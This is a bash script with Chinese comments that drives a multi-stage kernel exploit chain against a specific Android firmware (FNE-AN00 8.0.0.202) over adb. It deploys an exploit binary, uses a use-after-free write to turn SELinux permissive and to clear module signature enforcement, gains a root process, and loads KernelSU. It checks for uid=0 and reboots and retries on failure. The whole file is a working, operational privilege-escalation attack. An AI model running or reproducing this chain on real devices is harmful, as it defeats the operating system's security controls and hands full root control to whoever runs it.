#!/bin/bash
# root_now.sh — FNE-AN00 8.0.0.202(5.4.289) 一次性可复现提权（2026-11-12 真机配方）
#
# 与 run_forever.sh 的区别：这里只用**已验证**的串行时序，不跑 W1b，不并行，
# 不做「盲重试」；每步都有明确的成功判据，失败就 reboot 重来（最多 3 轮）。
#
#   1) 部署（缺什么推什么，不覆盖设备上已在跑的二进制）
#   2) 已在 root / KSU 已加载 → 直接退出 0
#   3) W1: `--write1` + GL_SKIP_W1B=1（只要 permissive，快）
#   3b) W1b: 若 `sig_enforce=Y`，单独串行补跑 W1b（GL_SKIP_W1B=0，drain 压到 1x64）
#       —— sig_enforce 的 module_param 是 0444，只能靠 UAF 写清零；chain gate 1 要求 N
#   4) 等 getenforce=Permissive，再静默 20s（让 ghost waiter park 稳）
#   5) W2: 单独跑，等 gl_w2.log 出现 `child is root!`
#   6) 等 chain_status=ok / /proc/modules 出现 kernelsu（≤180s）
#   7) 硬判据 `su -c id` 出 uid=0 → SUCCESS；否则 reboot 重来
#
# 用法：bash root_now.sh [--no-reboot]
set -u
cd "$(dirname "$0")" || exit 1

REPO=$(cd ../.. && pwd)
EXPLOIT_DIR="$REPO/root/exploit"
KSU_SRC="$REPO/root/ksu-late-load"
E=/data/local/tmp/e
KSU=/data/local/tmp/ksu_fne
REBOOT_OK=1
[ "${1:-}" = "--no-reboot" ] && REBOOT_OK=0

T30=""; T600=""
command -v timeout >/dev/null 2>&1 && { T30="timeout 30"; T600="timeout 600"; }

if ! command -v adb >/dev/null 2>&1; then
  echo "FATAL: adb not on PATH (Git Bash 里用 D:\\MiniApp\\platform-tools 加 PATH)"
  exit 127
fi

SYNC="GL_AIM_DM=1 GL_W1_ATTEMPTS=1 GL_ROUTE_ATTEMPTS=1 GL_HOLD_CHAIN=1 \
GL_HOLD_WAITER=1 GL_PUNCH_IN_WINDOW=1 GL_PUNCH_DELAY_USEC=0 GL_MCAST_ROUTE=1 \
GL_PROBE_BOOTID=0 GL_SPRAY_TEST=0 GL_STAMP_SYNC=1"

say() { echo "[$(date +%T)] $*"; }

wait_boot() {
  $T600 adb wait-for-device >/dev/null 2>&1
  local i=0 bc=""
  while [ "$i" -lt 60 ]; do
    bc=$($T30 adb shell getprop sys.boot_completed 2>/dev/null | tr -d '\r')
    [ "$bc" = "1" ] && return 0
    i=$((i+1)); sleep 5
  done
  return 1
}

deploy() {
  if ! $T30 adb shell "test -x $E" >/dev/null 2>&1; then
    say "deploy: push $EXPLOIT_DIR/ghostlock.fne202 -> $E"
    $T30 adb push "$EXPLOIT_DIR/ghostlock.fne202" "$E" >/dev/null 2>&1
    $T30 adb shell "chmod 755 $E" >/dev/null 2>&1
  fi
  if ! $T30 adb shell "test -f $KSU/kernelsu.ko" >/dev/null 2>&1; then
    say "deploy: push ksu-late-load/* -> $KSU/"
    $T30 adb shell "mkdir -p $KSU" >/dev/null 2>&1
    for f in chain_hook.sh kernelsu.ko ksud magiskpolicy ksu_rules load_ko kmsg_dumper fne_syms.txt; do
      [ -f "$KSU_SRC/$f" ] && $T30 adb push "$KSU_SRC/$f" "$KSU/$f" >/dev/null 2>&1
    done
    $T30 adb shell "chmod 755 $KSU/chain_hook.sh $KSU/magiskpolicy $KSU/ksud $KSU/load_ko $KSU/kmsg_dumper 2>/dev/null" >/dev/null 2>&1
  fi
}

su_ok() {
  local out=""
  for _ in 1 2 3; do
    out=$($T30 adb shell "su -c id" 2>/dev/null | tr -d '\r')
    case "$out" in uid=0*) echo "    su: $out"; return 0 ;; esac
    sleep 3
  done
  return 1
}

ksu_live() { $T30 adb shell "grep -q kernelsu /proc/modules" >/dev/null 2>&1; }

clean_state() {
  $T30 adb shell "rm -f /data/local/tmp/gl_w1.log /data/local/tmp/gl_w2.log \
    $KSU/chain_status $KSU/chain.log" >/dev/null 2>&1
}

launch_w1() {
  $T30 adb shell "rm -f /data/local/tmp/gl_w1.log" >/dev/null 2>&1
  $T30 adb shell "nohup env $SYNC GL_SKIP_W1B=1 $E --write1 > /data/local/tmp/gl_w1.log 2>&1 < /dev/null &" >/dev/null 2>&1
  local i=0 seen=0
  while [ "$i" -lt 96 ]; do
    sleep 5; i=$((i+1))
    if $T30 adb shell "grep -q 'SELinux DISABLED' /data/local/tmp/gl_w1.log" 2>/dev/null; then
      say "W1: SELinux DISABLED (t+$((i*5))s)"; seen=1; break
    fi
    if $T30 adb shell "grep -q 'Write 1 failed' /data/local/tmp/gl_w1.log" 2>/dev/null; then
      say "W1: write reported failure"; return 1
    fi
  done
  [ "$seen" = "1" ] || { say "W1: timeout waiting SELinux DISABLED"; return 1; }
  # 等 getenforce 真的变 Permissive（adbd 瞬断时多试几次）
  local gi=0 en=""
  while [ "$gi" -lt 24 ]; do
    en=$($T30 adb shell getenforce 2>/dev/null | tr -d '\r')
    [ "$en" = "Permissive" ] && { say "W1: getenforce=Permissive"; return 0; }
    gi=$((gi+1)); sleep 5
  done
  say "W1: getenforce=$en (expected Permissive)"; return 1
}

sig_enforce_val() {
  # Permissive 下 shell 就能读（enforcing 时是 SELinux MAC 拒绝）；Y=仍强制签名
  $T30 adb shell "cat /sys/module/module/parameters/sig_enforce 2>/dev/null" 2>/dev/null | tr -d '\r\n'
}

launch_w1b() {
  # 本机 sig_enforce 的 module_param 是 0444（不可写 sysfs），只能用 UAF 写清零。
  # SELinux 已 off 时 --write1 会走 "SELinux already off" 分支直接补 W1b。
  # 必须单独串行跑：W1b 的 slab_drain fork 风暴 + 并发 W2 = 保护性重启。
  $T30 adb shell "rm -f /data/local/tmp/gl_w1b.log" >/dev/null 2>&1
  $T30 adb shell "nohup env $SYNC GL_SKIP_W1B=0 GL_W1B_ATTEMPTS=3 GL_DRAIN_WAVES=1 GL_DRAIN_BATCH=64 $E --write1 > /data/local/tmp/gl_w1b.log 2>&1 < /dev/null &" >/dev/null 2>&1
  local i=0 seen=0 sv=""
  while [ "$i" -lt 48 ]; do
    sleep 5; i=$((i+1))
    if $T30 adb shell "grep -q 'SIG_ENFORCE DISABLED' /data/local/tmp/gl_w1b.log" 2>/dev/null; then
      say "W1b: SIG_ENFORCE DISABLED (t+$((i*5))s)"; seen=1; break
    fi
    if $T30 adb shell "grep -q 'W1b: sig_enforce still set' /data/local/tmp/gl_w1b.log" 2>/dev/null; then
      say "W1b: still set after attempts"; return 1
    fi
  done
  [ "$seen" = "1" ] || { say "W1b: timeout"; return 1; }
  sv=$(sig_enforce_val)
  say "W1b: sig_enforce=$sv"
  case "$sv" in N|0) return 0 ;; *) return 1 ;; esac
}

launch_w2() {  $T30 adb shell "rm -f /data/local/tmp/gl_w2.log" >/dev/null 2>&1
  $T30 adb shell "nohup env $SYNC GL_W2_ROUNDS=2 GL_W2_CRED_ADJ=0 $E > /data/local/tmp/gl_w2.log 2>&1 < /dev/null &" >/dev/null 2>&1
  local i=0
  while [ "$i" -lt 180 ]; do
    sleep 5; i=$((i+1))
    if $T30 adb shell "grep -q 'child is root' /data/local/tmp/gl_w2.log" 2>/dev/null; then
      say "W2: child is root (t+$((i*5))s)"; return 0
    fi
    local en
    en=$($T30 adb shell getenforce 2>/dev/null | tr -d '\r')
    [ -z "$en" ] && { sleep 5; continue; }
    if [ "$en" != "Permissive" ]; then
      say "W2: device no longer permissive (getenforce=$en) — reboot likely"; return 1
    fi
  done
  say "W2: timeout waiting 'child is root'"; return 1
}

wait_chain() {
  local i=0 cs=""
  while [ "$i" -lt 36 ]; do
    cs=$($T30 adb shell "cat $KSU/chain_status 2>/dev/null" | tr -d '\r')
    [ "$cs" = "ok" ] && { say "chain: status=ok"; return 0; }
    if ksu_live; then say "chain: kernelsu in /proc/modules"; return 0; fi
    i=$((i+1)); sleep 5
  done
  say "chain: not complete (status='$cs')"; return 1
}

for attempt in 1 2 3; do
  say "=== attempt $attempt/3 ==="
  wait_boot || { say "device not booted"; exit 1; }
  deploy
  if su_ok; then say "ALREADY ROOT — nothing to do"; exit 0; fi
  if ksu_live; then
    say "KSU already live but su failing — waiting for chain"
    wait_chain || true
    if su_ok; then exit 0; fi
  fi

  clean_state
  en=$($T30 adb shell getenforce 2>/dev/null | tr -d '\r')
  say "getenforce=$en"

  if [ "$en" != "Permissive" ]; then
    if ! launch_w1; then
      say "W1 failed"
      # boot_id 变了说明设备自己重启过（W1 崩），就不必再 reboot
      if [ "$REBOOT_OK" = "1" ]; then say "reboot + retry"; adb reboot >/dev/null 2>&1; sleep 45; wait_boot || true; sleep 20; fi
      continue
    fi
  fi

  sv=$(sig_enforce_val)
  say "sig_enforce=$sv"
  case "$sv" in
    N|0) : ;;
    *)
      say "W1b needed (sig_enforce=$sv) — chain gate 1 requires N"
      if ! launch_w1b; then
        say "W1b failed (or device died)"
        if [ "$REBOOT_OK" = "1" ]; then say "reboot + retry"; adb reboot >/dev/null 2>&1; sleep 45; wait_boot || true; sleep 20; fi
        continue
      fi
      ;;
  esac

  say "quiesce 20s before W2 (ghost waiter must be parked)"
  sleep 20

  if ! launch_w2; then
    if [ "$REBOOT_OK" = "1" ]; then say "W2 failed — reboot + retry"; adb reboot >/dev/null 2>&1; sleep 45; wait_boot || true; sleep 20; fi
    continue
  fi

  wait_chain || true
  if su_ok; then
    say "=== SUCCESS: root + KernelSU ready ==="
    $T30 adb shell "su -c 'grep -m1 kernelsu /proc/modules'" 2>/dev/null | tr -d '\r'
    exit 0
  fi
  say "=== ROOT-NO-KSU (su unusable) ==="
  if [ "$REBOOT_OK" = "1" ]; then say "reboot + retry"; adb reboot >/dev/null 2>&1; sleep 45; wait_boot || true; sleep 20; fi
done

say "=== FAILED after 3 attempts ==="
exit 3
